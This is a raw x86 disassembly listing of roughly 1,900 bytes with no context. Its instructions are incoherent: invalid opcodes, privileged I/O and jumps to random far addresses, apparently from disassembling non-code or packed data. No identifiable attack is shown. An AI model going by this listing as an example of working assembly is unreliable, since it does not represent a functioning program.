  4070e0:	and    DWORD PTR [ebx-0x32bd8150],esp
  4070e6:	call   0x9ffb:0xea7cefe0
  4070ed:	mov    edi,0x3cf9207
  4070f2:	jl     0x4070b9
  4070f4:	push   edi
  4070f5:	inc    esi
  4070f6:	rol    BYTE PTR [edi],1
  4070f8:	clc    
  4070f9:	adc    BYTE PTR [esi-0x102ae8c4],bl
  4070ff:	mov    esp,edx
  407101:	cld    
  407102:	mov    WORD PTR fs:[edx-0x20],?
  407106:	pop    ebx
  407107:	and    al,0x34
  407109:	mov    bh,0x8d
  40710b:	and    bl,dl
  40710d:	and    DWORD PTR [edx+0x44a60ed3],esp
  407113:	and    ecx,ebp
  407115:	in     al,dx
  407116:	sbb    DWORD PTR [ecx],edx
  407118:	rol    ebp,0xb6
  40711b:	xchg   ebx,eax
  40711c:	sbb    ecx,DWORD PTR ss:[ecx+0x69]
  407120:	fs xchg ebp,eax
  407122:	or     eax,0xcaef60d8
  407127:	pop    ecx
  407128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407129:	sub    al,0xb2
  40712b:	xor    ch,ah
  40712d:	stos   BYTE PTR es:[edi],al
  40712e:	cmp    BYTE PTR [eax+0x3b],ah
  407131:	pop    ss
  407132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407133:	retf   0x6f6a
  407136:	xor    al,0x7d
  407138:	jg     0x4070de
  40713a:	sar    esi,1
  40713c:	xchg   ebx,eax
  40713d:	inc    ebp
  40713e:	les    eax,FWORD PTR [eax-0x47b7e7f1]
  407144:	hlt    
  407145:	int    0xe2
  407147:	jmp    0x4e849fb0
  40714c:	das    
  40714d:	fadd   DWORD PTR [ecx+eiz*4]
  407150:	js     0x407101
  407152:	xor    eax,0x12b0621a
  407157:	ficomp DWORD PTR [ebx]
  407159:	std    
  40715a:	pop    esp
  40715b:	and    eax,0x4a306081
  407160:	mov    al,0x34
  407162:	cld    
  407163:	mov    dl,dl
  407165:	sbb    DWORD PTR [edi+0x0],0x70b94d03
  40716c:	mov    bl,0xc3
  40716e:	retf   
  40716f:	(bad)  [eax-0x35]
  407172:	add    eax,0x57212764
  407177:	xor    al,0xbd
  407179:	or     BYTE PTR [edx-0x43466916],ah
  40717f:	js     0x4071dc
  407181:	add    ch,BYTE PTR [eax]
  407183:	mov    dl,0xba
  407185:	bound  esp,QWORD PTR [ebx+0x5eeee301]
  40718b:	push   es
  40718c:	mov    cs,WORD PTR [ebx+0x9]
  40718f:	jbe    0x407210
  407191:	jg     0x407157
  407193:	pop    esi
  407194:	inc    edi
  407195:	cmp    eax,0x148dbeb7
  40719a:	and    esp,DWORD PTR [ecx+0x75]
  40719d:	jmp    0x9163af9d
  4071a2:	xchg   edi,eax
  4071a3:	rol    DWORD PTR [esi-0x4f],0x43
  4071a7:	pop    edi
  4071a8:	and    al,0x48
  4071aa:	test   al,0x29
  4071ac:	mov    WORD PTR [edi],cs
  4071ae:	lds    esi,FWORD PTR [ecx+0x15d04187]
  4071b4:	cwde   
  4071b5:	leave  
  4071b6:	inc    ebx
  4071b7:	sub    dh,BYTE PTR [ecx]
  4071b9:	dec    ebx
  4071ba:	push   0x4c
  4071bc:	dec    eax
  4071bd:	mov    ebx,0x174bd52b
  4071c2:	and    DWORD PTR [edi+0x6eadd74b],edx
  4071c8:	xlat   BYTE PTR ds:[ebx]
  4071c9:	jno    0x4071fe
  4071cb:	and    al,0xcd
  4071cd:	or     dh,BYTE PTR [edi]
  4071cf:	popa   
  4071d0:	daa    
  4071d1:	pop    eax
  4071d2:	inc    edi
  4071d3:	inc    edi
  4071d4:	pop    DWORD PTR [ecx+0x50f65ec3]
  4071da:	outs   dx,BYTE PTR ds:[esi]
  4071db:	inc    ebp
  4071dc:	cmp    eax,0x39648d36
  4071e1:	test   eax,0xd9531655
  4071e6:	or     cl,BYTE PTR [esi+0x44]
  4071e9:	push   ss
  4071ea:	scas   al,BYTE PTR es:[edi]
  4071eb:	push   esp
  4071ec:	sub    al,BYTE PTR [ebx+0x67]
  4071ef:	mov    ebx,0xf038a94f
  4071f4:	dec    DWORD PTR [ebp-0x3b744d64]
  4071fa:	mov    eax,DWORD PTR [esi]
  4071fc:	out    0xe,eax
  4071fe:	cli    
  4071ff:	shl    BYTE PTR [edi+esi*8-0x80],cl
  407203:	dec    ebp
  407204:	mov    ch,0x99
  407206:	cmp    ecx,DWORD PTR [ecx-0x2e24176e]
  40720c:	loop   0x40721b
  40720e:	in     eax,dx
  40720f:	push   0xffffffd1
  407211:	js     0x4071f1
  407213:	mov    BYTE PTR [ecx+0x51c30155],bh
  407219:	mov    al,0xb2
  40721b:	stos   DWORD PTR es:[edi],eax
  40721c:	dec    esi
  40721d:	leave  
  40721e:	sahf   
  40721f:	xor    eax,0x84b66550
  407224:	gs jnp 0x407206
  407227:	inc    esp
  407228:	cmp    DWORD PTR [edi+0x63],0xe94f584d
  40722f:	or     ah,BYTE PTR [eax]
  407231:	push   ds
  407232:	dec    ebx
  407233:	ds loope 0x40721b
  407236:	clc    
  407237:	out    0x64,eax
  407239:	pop    eax
  40723a:	cmp    BYTE PTR [edx-0x7d],bl
  40723d:	jmp    0x7da14d6d
  407242:	dec    ecx
  407243:	rcl    DWORD PTR [edx-0x67],1
  407246:	pushf  
  407247:	(bad)  
  407248:	sahf   
  407249:	inc    eax
  40724a:	mov    bh,0x8f
  40724c:	or     BYTE PTR [edi],ah
  40724e:	xchg   DWORD PTR [ebx+esi*2+0x77],ebp
  407252:	(bad)  
  407253:	mov    edi,0xb70c7cad
  407258:	push   edx
  407259:	loopne 0x4072c5
  40725b:	xchg   ecx,eax
  40725c:	mov    cl,al
  40725e:	adc    esi,ecx
  407260:	sub    BYTE PTR gs:[ebx-0x6a],al
  407264:	loopne 0x4072d4
  407266:	push   eax
  407267:	sub    al,0xa5
  407269:	xchg   BYTE PTR [ebx],bh
  40726b:	arpl   WORD PTR [edi],bp
  40726d:	ret    
  40726e:	hlt    
  40726f:	cmc    
  407270:	movups XMMWORD PTR [edi],xmm4
  407273:	xchg   esi,eax
  407274:	call   0x9e705a9e
  407279:	sbb    ah,0xe0
  40727c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40727d:	retf   0x8422
  407280:	daa    
  407281:	xlat   BYTE PTR ds:[ebx]
  407282:	sub    ch,bh
  407284:	dec    esp
  407285:	and    al,bh
  407287:	mov    al,ds:0x6dc3a270
  40728c:	cwde   
  40728d:	push   eax
  40728e:	cmp    bl,bh
  407290:	leave  
  407291:	pop    esp
  407292:	test   DWORD PTR [ecx-0x43],edi
  407295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407296:	pop    esp
  407297:	stos   DWORD PTR es:[edi],eax
  407298:	mov    cl,0x96
  40729a:	cmp    ax,0xcf9a
  40729e:	loope  0x407299
  4072a0:	test   DWORD PTR [ebp-0x4c7e042c],ebp
  4072a6:	inc    ebp
  4072a7:	or     al,0x30
  4072a9:	ror    ecx,1
  4072ab:	rcr    DWORD PTR [eax-0x33],0x4e
  4072af:	pop    ecx
  4072b0:	mov    ebx,0xb9471f40
  4072b5:	fstp   DWORD PTR [ebp+0x45be4402]
  4072bb:	mov    DWORD PTR [eax],edx
  4072bd:	mov    BYTE PTR [bp+si-0x44],bh
  4072c1:	aas    
  4072c2:	push   ss
  4072c3:	ja     0x407262
  4072c5:	icebp  
  4072c6:	js     0x4072b5
  4072c8:	sbb    DWORD PTR [esi-0x3a1a757f],esi
  4072ce:	out    dx,al
  4072cf:	lods   eax,DWORD PTR ds:[esi]
  4072d0:	xor    eax,0xbfbdd5f2
  4072d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072d6:	out    0xc3,eax
  4072d8:	add    cl,BYTE PTR [eax]
  4072da:	sub    esi,DWORD PTR [ecx]
  4072dc:	retf   0x44db
  4072df:	xchg   ebp,eax
  4072e0:	push   ebp
  4072e1:	jge    0x407328
  4072e3:	adc    esp,DWORD PTR [edx]
  4072e5:	pop    esp
  4072e6:	(bad)  
  4072e8:	mov    bh,bh
  4072ea:	sub    edx,DWORD PTR [ebx-0x46bf8ca5]
  4072f0:	mov    cl,0x59
  4072f2:	call   FWORD PTR [eax]
  4072f4:	test   DWORD PTR [eax+edx*4+0x39],edi
  4072f8:	jae    0x4072e3
  4072fa:	push   ss
  4072fb:	push   esp
  4072fc:	sub    bl,BYTE PTR [eax]
  4072fe:	out    0xb4,al
  407300:	cmc    
  407301:	scas   eax,DWORD PTR es:[edi]
  407302:	and    dl,BYTE PTR [ebx]
  407304:	pop    ebp
  407305:	xchg   ecx,eax
  407306:	xor    edi,0x40
  407309:	push   ecx
  40730a:	pushf  
  40730b:	push   ds
  40730c:	jbe    0x4072bd
  40730e:	int3   
  40730f:	push   edi
  407310:	cmp    ebx,DWORD PTR [ecx]
  407312:	push   es
  407313:	jmp    DWORD PTR [edi+0x68]
  407316:	sahf   
  407317:	enter  0xba98,0xa6
  40731b:	push   ss
  40731c:	push   eax
  40731d:	stos   DWORD PTR es:[edi],eax
  40731e:	pusha  
  40731f:	or     DWORD PTR [ebx-0x48],esp
  407322:	stc    
  407323:	push   eax
  407324:	mov    ebp,0x8cea3fb7
  407329:	in     al,0x56
  40732b:	or     DWORD PTR [eax+0x68],0x12612c66
  407332:	repz cld 
  407334:	addr16 fwait
  407336:	shl    DWORD PTR [ebx+eax*8+0x783a8df5],1
  40733d:	lods   al,BYTE PTR ds:[esi]
  40733e:	mov    bh,0xf8
  407340:	outs   dx,DWORD PTR ds:[esi]
  407341:	nop
  407342:	push   esp
  407343:	cld    
  407344:	not    dl
  407346:	cs mov esp,0xb01629ba
  40734c:	mov    dh,0xcb
  40734e:	adc    BYTE PTR [edx-0x6ed92829],ah
  407354:	inc    ebx
  407355:	sbb    cl,BYTE PTR [ebp-0x8185c12]
  40735b:	les    edi,FWORD PTR [ecx]
  40735d:	fmul   st(6),st
  40735f:	fnsave [ebx+0x6a]
  407362:	xchg   edx,eax
  407363:	in     eax,0xd5
  407365:	test   dl,cl
  407367:	mov    cl,0x17
  407369:	daa    
  40736a:	shl    DWORD PTR [edx],cl
  40736c:	xchg   DWORD PTR [edx+0x51],edi
  40736f:	and    esp,DWORD PTR [edx+0x41]
  407372:	mov    ebx,ebp
  407374:	push   ds
  407375:	inc    edi
  407376:	imul   esp,DWORD PTR [ecx+esi*1],0xffffffc4
  40737a:	daa    
  40737b:	pop    esi
  40737c:	shl    BYTE PTR cs:[eax+0x7ba2eeb6],cl
  407383:	rol    BYTE PTR [edx+0x1af1f92d],cl
  407389:	jbe    0x407350
  40738b:	jnp    0x407356
  40738d:	ror    dl,cl
  40738f:	addr16 aaa 
  407391:	inc    ebp
  407392:	dec    ebp
  407393:	push   0x0
  407395:	sub    BYTE PTR [ebx],0x2c
  407398:	mov    gs,WORD PTR [ecx]
  40739a:	sti    
  40739b:	push   ebx
  40739c:	outs   dx,DWORD PTR ds:[esi]
  40739d:	add    bl,BYTE PTR [esi]
  40739f:	push   cs
  4073a0:	sbb    DWORD PTR [ecx],ebx
  4073a2:	or     BYTE PTR [edi],dl
  4073a4:	jecxz  0x4073a4
  4073a6:	lds    esi,FWORD PTR [ecx-0x7e127773]
  4073ac:	mov    bh,0x21
  4073ae:	add    al,0xee
  4073b0:	stos   DWORD PTR es:[edi],eax
  4073b1:	ret    0xcce
  4073b4:	inc    ecx
  4073b5:	mov    ds:0x2d50ec0b,eax
  4073ba:	mov    ebx,0x7769b3d9
  4073bf:	mov    ebp,0x60cd137b
  4073c4:	lahf   
  4073c5:	xchg   ebx,eax
  4073c6:	jns    0x4073c4
  4073c8:	xlat   BYTE PTR ds:[bx]
  4073ca:	imul   edx,esp,0x78134afa
  4073d0:	mov    bl,BYTE PTR [edi+0x59452816]
  4073d6:	jae    0x4073b9
  4073d8:	fimul  DWORD PTR [eax-0x2d]
  4073db:	jge    0x407437
  4073dd:	mov    esi,0x922b5287
  4073e2:	mov    dh,0xea
  4073e4:	sar    DWORD PTR [edx-0x10],cl
  4073e7:	mov    ecx,0x3a5c158c
  4073ec:	dec    edi
  4073ed:	and    BYTE PTR [edx*8-0x249b31e0],dh
  4073f4:	cmc    
  4073f5:	icebp  
  4073f6:	mov    ebx,0x48fa0de0
  4073fb:	sub    BYTE PTR [ebp-0x20b6da5c],dl
  407401:	mov    dh,0xec
  407403:	pop    ds
  407404:	sti    
  407405:	in     eax,0xe6
  407407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407408:	ret    
  407409:	jb     0x4073f7
  40740b:	xlat   BYTE PTR ds:[ebx]
  40740c:	mov    esp,0xf0cfcbfa
  407411:	dec    ecx
  407412:	adc    al,0x8e
  407414:	inc    edi
  407415:	mov    edi,0x72a931e8
  40741a:	cs cmc 
  40741c:	mov    ebp,0x555a16b2
  407421:	int3   
  407422:	inc    edx
  407423:	ror    al,1
  407425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407426:	ret    0xc2e1
  407429:	mov    esp,0xdd22b9de
  40742e:	mov    DWORD PTR [eax+ebp*4+0x24ac317c],esi
  407435:	mov    esp,0xac7d06aa
  40743a:	ret    0xbcb7
  40743d:	stos   DWORD PTR es:[edi],eax
  40743e:	push   ebx
  40743f:	cmp    bl,BYTE PTR [esi+0x1f]
  407442:	sub    bl,BYTE PTR [ebx]
  407444:	cmc    
  407445:	inc    ebp
  407446:	iret   
  407447:	push   ecx
  407448:	jnp    0x40744d
  40744a:	xchg   ebp,eax
  40744b:	xchg   ebx,eax
  40744c:	push   esp
  40744d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40744e:	or     DWORD PTR [edx+0x7b23acf4],eax
  407454:	cwde   
  407455:	xchg   DWORD PTR [ebx+0x2e],ecx
  407458:	rcr    edi,cl
  40745a:	mov    ds:0xb4db0e34,eax
  40745f:	cmp    eax,0xf94decfd
  407464:	mov    dh,0x33
  407466:	inc    ecx
  407467:	lahf   
  407468:	out    dx,eax
  407469:	iret   
  40746a:	dec    eax
  40746b:	push   esi
  40746c:	shr    cl,0xf6
  40746f:	aaa    
  407470:	mov    esi,0xad054214
  407475:	js     0x407437
  407477:	jl     0x4074e0
  407479:	xor    al,0x54
  40747b:	push   ss
  40747c:	ins    DWORD PTR es:[edi],dx
  40747d:	push   esp
  40747e:	not    bl
  407480:	out    0x5a,al
  407482:	push   esp
  407483:	bound  ebp,QWORD PTR [edi+0x16e98576]
  407489:	es pushf 
  40748b:	sub    esi,DWORD PTR [ebx+ebp*4]
  40748e:	(bad)  [ecx-0x44]
  407491:	adc    esi,DWORD PTR [edi+0x11de3b01]
  407497:	iret   
  407498:	fmul   QWORD PTR [ecx]
  40749a:	inc    esi
  40749b:	jns    0x407472
  40749d:	shr    bh,0x85
  4074a0:	into   
  4074a1:	push   0xffffffb9
  4074a3:	call   0x5381cfa5
  4074a8:	inc    esp
  4074a9:	lds    ecx,FWORD PTR [ebx-0x67]
  4074ac:	call   0xc0e922f2
  4074b1:	pop    edx
  4074b2:	sbb    al,0x62
  4074b4:	in     eax,0xe2
  4074b6:	push   esi
  4074b7:	in     al,0xf7
  4074b9:	jecxz  0x407442
  4074bb:	aam    0x5a
  4074bd:	mov    bl,ch
  4074bf:	gs aas 
  4074c1:	jp     0x4074c3
  4074c3:	in     eax,dx
  4074c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074c5:	push   ds
  4074c6:	and    ebx,DWORD PTR [eax+ebx*1+0x1d6bef38]
  4074cd:	xor    BYTE PTR [ebx+ebp*2+0x52],dh
  4074d1:	dec    edx
  4074d2:	scas   al,BYTE PTR es:[edi]
  4074d3:	jae    0x4074dd
  4074d5:	sar    BYTE PTR [eax-0x4a],1
  4074d8:	out    dx,eax
  4074d9:	sub    al,0x6c
  4074db:	sub    esp,DWORD PTR [ecx-0x26]
  4074de:	add    eax,0xe02b7ee7
  4074e3:	mov    ecx,fs
  4074e5:	fisttp DWORD PTR [esp+ebp*2-0x68]
  4074e9:	xchg   esp,eax
  4074ea:	stos   BYTE PTR es:[edi],al
  4074eb:	cmp    eax,0x2075a301
  4074f0:	rol    BYTE PTR [edi+0x2e],1
  4074f3:	scas   eax,DWORD PTR es:[edi]
  4074f4:	stc    
  4074f5:	call   0xea8b:0x8e9713c2
  4074fc:	jl     0x407528
  4074fe:	sar    dh,cl
  407500:	sti    
  407501:	(bad)  [eax]
  407503:	or     dh,BYTE PTR [edi+0x4f]
  407506:	fs xchg ebx,eax
  407508:	mov    dl,0x41
  40750a:	add    ch,BYTE PTR [eax+0x60324467]
  407510:	mov    bl,0xf2
  407512:	push   0xffffffc6
  407514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407515:	ins    DWORD PTR es:[edi],dx
  407516:	jne    0x40755e
  407518:	cwde   
  407519:	push   ecx
  40751a:	mov    eax,ds:0x87507f6b
  40751f:	test   BYTE PTR [esi],dh
  407521:	inc    ecx
  407522:	push   ss
  407523:	xor    ch,cl
  407525:	jo     0x407528
  407527:	sbb    al,0x1f
  407529:	xchg   BYTE PTR [edx-0xe],al
  40752c:	jg     0x40751e
  40752e:	popa   
  40752f:	and    al,0x36
  407531:	ds jnp 0x4075ac
  407534:	push   DWORD PTR [edi-0x1d]
  407537:	xchg   edi,eax
  407538:	scas   eax,DWORD PTR es:[edi]
  407539:	adc    eax,0xed53b3bf
  40753e:	dec    eax
  40753f:	dec    esp
  407540:	(bad)
  407544:	mov    edx,0x333e2618
  407549:	ror    BYTE PTR [edi],0x24
  40754c:	cwde   
  40754d:	test   al,0xa6
  40754f:	das    
  407550:	shr    DWORD PTR [edx-0x27],1
  407553:	ret    
  407554:	inc    ecx
  407555:	ret    
  407556:	pusha  
  407557:	hlt    
  407558:	inc    BYTE PTR [edi-0x3652dd31]
  40755e:	xor    esp,DWORD PTR [edx]
  407560:	mov    esi,DWORD PTR [ebx+0x366d421d]
  407566:	pop    ebp
  407567:	outs   dx,DWORD PTR ds:[esi]
  407568:	inc    edx
  407569:	call   0xa678474a
  40756e:	mov    al,ds:0x80553a7f
  407573:	xor    al,0x24
  407575:	clc    
  407576:	retf   
  407577:	push   ds
  407578:	and    eax,0xa45a2e32
  40757d:	test   al,0x65
  40757f:	push   ebp
  407580:	or     al,0x1d
  407582:	pop    edi
  407583:	sub    al,0xde
  407585:	cwde   
  407586:	fdecstp 
  407588:	adc    BYTE PTR [esi-0x6e],0x8a
  40758c:	xor    al,0x52
  40758e:	jbe    0x40760c
  407590:	stos   DWORD PTR es:[edi],eax
  407591:	(bad)  
  407593:	cmp    ah,BYTE PTR [ebp+0x6c]
  407596:	and    dl,BYTE PTR [ebp-0x70]
  407599:	mov    esp,0xbcbed885
  40759e:	(bad)  
  40759f:	push   ss
  4075a0:	sub    ecx,eax
  4075a2:	inc    esi
  4075a3:	sub    ebp,DWORD PTR [edi]
  4075a5:	cdq    
  4075a6:	xchg   ebx,eax
  4075a7:	das    
  4075a8:	xchg   ebx,esi
  4075aa:	sbb    cl,BYTE PTR [eax+0x1d]
  4075ad:	inc    ecx
  4075ae:	mov    bl,BYTE PTR [edx+0x7c7e12af]
  4075b4:	push   ebp
  4075b5:	sbb    cl,BYTE PTR [edi+0x7e355714]
  4075bb:	sbb    BYTE PTR [ebp-0x796e1fec],bh
  4075c1:	mov    bh,0xef
  4075c3:	add    eax,0x6aa48486
  4075c8:	cli    
  4075c9:	retf   0xbb1e
  4075cc:	fcomp  DWORD PTR [eax+0x631abbe7]
  4075d2:	pop    esi
  4075d3:	xor    edi,DWORD PTR [eax-0x74]
  4075d6:	pop    edi
  4075d7:	mov    bl,BYTE PTR [edx+0x6884ceaf]
  4075dd:	cwde   
  4075de:	sti    
  4075df:	(bad)  
  4075e0:	adc    eax,0xa0b8b5bd
  4075e5:	sub    eax,0x231903e0
  4075ea:	(bad)  
  4075eb:	cmc    
  4075ec:	jecxz  0x4075fa
  4075ee:	(bad)
  4075f1:	int3   
  4075f2:	daa    
  4075f3:	adc    esp,edx
  4075f5:	xor    BYTE PTR [edx-0x4c998ddc],dl
  4075fb:	lds    esi,FWORD PTR [ebp+0x46]
  4075fe:	sbb    dh,BYTE PTR [esi-0x53333625]
  407604:	cmp    eax,eax
  407606:	loopne 0x4075b4
  407608:	gs es dec ecx
  40760b:	pushf  
  40760c:	mov    dl,0xa5
  40760e:	ret    0x5b55
  407611:	sub    eax,0xd7ae1684
  407616:	out    dx,eax
  407617:	inc    edi
  407618:	dec    ebp
  407619:	jmp    0x54d3bd26
  40761e:	sub    DWORD PTR [ebx],edx
  407620:	push   0xc11c65eb
  407625:	les    edx,FWORD PTR [ebp+0x1]
  407628:	imul   esp,esp,0xb46d0ddb
  40762e:	cmp    ecx,DWORD PTR [edi-0x1b]
  407631:	xor    ebp,DWORD PTR [edx+0x4]
  407634:	mov    al,ds:0x4cec3d65
  407639:	jle    0x4075d9
  40763b:	test   al,0xf6
  40763d:	dec    ecx
  40763e:	cmp    edi,ebx
  407640:	pop    eax
  407641:	fisttp WORD PTR [edi]
  407643:	retf   
  407644:	cmp    eax,0x304a69bf
  407649:	push   ecx
  40764a:	std    
  40764b:	dec    esi
  40764c:	stos   BYTE PTR es:[edi],al
  40764d:	rcr    dh,0x75
  407650:	jb     0x407688
  407652:	ds leave 
  407654:	mov    ds:0x3769da41,eax
  407659:	xlat   BYTE PTR ds:[ebx]
  40765a:	sti    
  40765b:	or     ebp,edx
  40765d:	xchg   BYTE PTR [eax],al
  40765f:	ret    0x4ec1
  407662:	push   es
  407663:	push   edi
  407664:	hlt    
  407665:	fstp   DWORD PTR [ebx+eiz*2]
  407668:	cld    
  407669:	sbb    dh,BYTE PTR [eax]
  40766b:	xor    ch,BYTE PTR [ebp+0x770746cf]
  407671:	fist   WORD PTR [edi-0x1155d653]
  407677:	xchg   bh,dl
  407679:	inc    esp
  40767a:	mov    bh,0xb5
  40767c:	xor    cl,BYTE PTR [edx]
  40767e:	inc    ecx
  40767f:	and    BYTE PTR [ecx-0x1385bdf9],cl
  407685:	push   ds
  407686:	inc    dx
  407688:	mov    ecx,0x187a1a24
  40768d:	sub    esp,DWORD PTR [esp+esi*1-0x1a]
  407691:	ror    DWORD PTR [ebp-0x9da3b6e],cl
  407697:	sub    BYTE PTR [edi+0x3f0c3480],cl
  40769d:	pushf  
  40769e:	fcom   DWORD PTR [ecx-0x74]
  4076a1:	and    eax,0xd3db3190
  4076a6:	enter  0xe093,0x1c
  4076aa:	adc    BYTE PTR [ecx+ebp*4+0x67710dee],al
  4076b1:	sub    eax,0x9b78ce
  4076b6:	scas   al,BYTE PTR es:[edi]
  4076b7:	ror    DWORD PTR [eax-0x3714935],cl
  4076bd:	jg     0x4076e7
  4076bf:	js     0x4076ce
  4076c1:	(bad)  
  4076c2:	lods   eax,DWORD PTR ds:[esi]
  4076c3:	dec    ecx
  4076c4:	jle    0x4076e0
  4076c6:	lahf   
  4076c7:	inc    ebx
  4076c8:	repz or BYTE PTR [edi+0x33],al
  4076cc:	neg    bh
  4076ce:	ins    DWORD PTR es:[edi],dx
  4076cf:	sbb    al,0xff
  4076d1:	daa    
  4076d2:	dec    ecx
  4076d3:	lea    eax,[esi]
  4076d5:	or     ebp,DWORD PTR [ebx-0x41]
  4076d8:	fistp  DWORD PTR [edi+0x5dcfd9b1]
  4076de:	cmp    eax,0x6148e473
  4076e3:	jle    0x40772c
  4076e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076e6:	outs   dx,BYTE PTR ds:[esi]
  4076e7:	add    BYTE PTR [edx],cl
  4076e9:	and    esi,edi
  4076eb:	pop    esi
  4076ec:	sbb    cl,0x42
  4076ef:	jbe    0x40768a
  4076f1:	mov    ebx,0xdcc04a3e
  4076f6:	outs   dx,BYTE PTR ds:[esi]
  4076f7:	dec    ebp
  4076f8:	cmp    al,0x84
  4076fa:	dec    esi
  4076fb:	pop    ecx
  4076fc:	jecxz  0x407707
  4076fe:	inc    edx
  4076ff:	cld    
  407700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407701:	jns    0x4076d4
  407703:	mov    ebx,0x3393ae87
  407708:	cwde   
  407709:	lea    eax,[esi]
  40770b:	push   ebp
  40770c:	(bad)  
  40770d:	push   0x5d32db0e
  407712:	mov    DWORD PTR [edx+0x7b],eax
  407715:	retf   0xed1e
  407718:	jmp    0x4076ab
  40771a:	cli    
  40771b:	ret    
  40771c:	xlat   BYTE PTR ds:[ebx]
  40771d:	gs out 0xc8,al
  407720:	jge    0x407795
  407722:	jge    0x4076d3
  407724:	enter  0x83be,0x44
  407728:	scas   eax,DWORD PTR es:[edi]
  407729:	cli    
  40772a:	fst    QWORD PTR cs:[esi+0x5]
  40772e:	cmp    al,BYTE PTR [ecx+0xb8d602f]
  407734:	jae    0x4077ab
  407736:	xchg   ecx,eax
  407737:	xor    eax,0x6670bf6d
  40773c:	aaa    
  40773d:	cmp    BYTE PTR [edx-0x4e61084],cl
  407743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407744:	scas   eax,DWORD PTR es:[edi]
  407745:	pop    es
  407746:	add    DWORD PTR [ebp+0x43],esp
  407749:	outs   dx,DWORD PTR ds:[esi]
  40774a:	xor    DWORD PTR [esi*2+0x3f000092],esp
  407751:	fiadd  DWORD PTR [edx-0x24]
  407754:	retf   
  407755:	adc    eax,0x52de0fc0
  40775a:	or     BYTE PTR [ebx+edx*4],0x98
  40775e:	mov    ?,ebp
  407760:	and    DWORD PTR [ebx-0x54],eax
  407763:	push   esp
  407764:	sbb    al,0xf7
  407766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407767:	fimul  DWORD PTR [edx+0x1a61ed9a]
  40776d:	mov    esi,0x85c8f237
  407772:	ret    
  407773:	jl     0x407758
  407775:	and    edi,0xf78a25e6
  40777b:	adc    BYTE PTR [edi+0xb791b03],dh
  407781:	and    al,0x56
  407783:	mov    ds:0x568f7479,al
  407788:	mov    ds:0x6f82eb79,al
  40778d:	icebp  
  40778e:	dec    edi
  40778f:	mov    BYTE PTR [edx+edi*4-0x3b],dl
  407793:	pop    edi
  407794:	adc    eax,0x15695c33
  407799:	out    0xff,al
  40779b:	loop   0x40781c
  40779d:	and    al,0x77
  40779f:	in     eax,dx
  4077a0:	leave  
  4077a1:	adc    DWORD PTR [eax],edi
  4077a3:	xchg   esi,eax
  4077a4:	push   eax
  4077a5:	dec    edx
  4077a6:	mov    esi,0x608d4e54
  4077ab:	scas   eax,DWORD PTR es:[edi]
  4077ac:	push   ds
  4077ad:	repz aad 0xf7
  4077b0:	xchg   BYTE PTR [ebp+ebp*1+0x2e],dh
  4077b4:	test   eax,0xea268f2c
  4077b9:	push   es
  4077ba:	stos   BYTE PTR es:[edi],al
  4077bb:	and    eax,0xd85eb59c
  4077c0:	(bad)  
  4077c1:	and    ebx,DWORD PTR [edx-0x1c32c3de]
  4077c7:	dec    esp
  4077c8:	fwait
  4077c9:	jp     0x407821
  4077cb:	or     ebp,DWORD PTR cs:[esi+0x76]
  4077cf:	adc    bl,bl
  4077d1:	sbb    BYTE PTR [eax],al
  4077d3:	leave  
  4077d4:	ins    DWORD PTR es:[edi],dx
  4077d5:	in     eax,dx
  4077d6:	push   edi
  4077d7:	dec    esp
  4077d8:	push   eax
  4077d9:	xor    BYTE PTR [eax-0x7f7115f],ch
  4077df:	push   esp
  4077e0:	test   al,0x9
  4077e2:	push   ebp
  4077e3:	xchg   ebp,eax
  4077e4:	int    0x52
  4077e6:	mov    al,bl
  4077e8:	loope  0x4077c6
  4077ea:	sub    eax,0x89ad4fac
  4077ef:	jg     0x407826
  4077f1:	or     DWORD PTR [ecx],edx
  4077f3:	push   ds
  4077f4:	inc    edi
  4077f5:	call   0xe7cc:0xdc0b693e
  4077fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077fd:	jl     0x407820
  4077ff:	jnp    0x4077b7
  407801:	mov    ah,0xd6
  407803:	xchg   edx,eax
  407804:	mov    ecx,0xb4b83886
  407809:	fisttp QWORD PTR [esi]
  40780b:	sbb    edi,DWORD PTR ds:0xc6f74478
  407811:	dec    esp
  407812:	and    BYTE PTR [ebx],dl
  407814:	loopne 0x407836
  407816:	jnp    0x4077f8
  407818:	push   ebx
  407819:	js     0x407865
  40781b:	dec    ebp
  40781c:	add    ch,BYTE PTR [ecx+0x4f]
  40781f:	jg     0x4077c1
  407821:	adc    BYTE PTR [ecx+ebp*2-0x1ada94c4],0xb8
  407829:	sahf   
  40782a:	mov    cl,0x92
  40782c:	xor    DWORD PTR [eax+0x15689841],eax
  407832:	lods   al,BYTE PTR ds:[esi]
  407833:	ficom  DWORD PTR [ecx-0x6b]
  407836:	aam    0x3d
  407838:	push   ds
  407839:	push   eax
  40783a:	xor    ebx,DWORD PTR [edi+0x45]
  40783d:	fisubr DWORD PTR [esi-0x74627418]
  407843:	or     BYTE PTR [ecx],ah
  407845:	pop    ecx
  407846:	add    al,BYTE PTR [ebp-0x17]
  407849:	shr    DWORD PTR [ecx+0x3596ca2a],cl
  40784f:	jns    0x407833
  407851:	jmp    0x4078c6
  407853:	xchg   esi,eax
  407854:	scas   eax,DWORD PTR es:[edi]
  407855:	lds    esi,FWORD PTR [eax-0x68]
  407858:	in     eax,0xfa
  40785a:	pop    ebp
  40785b:	jae    0x4077fc
  40785d:	jg     0x4078ca
  40785f:	gs call 0x37cb11fd
  407865:	stos   DWORD PTR es:[di],eax
  407867:	jae    0x407843
  407869:	(bad)  
  40786b:	mov    dl,0xcd
  40786d:	popf   
  40786e:	inc    ecx
  40786f:	push   ecx
  407870:	and    edi,DWORD PTR [esi+0x2b]
  407873:	push   ecx
  407874:	mov    edx,0x4bc1ca3d
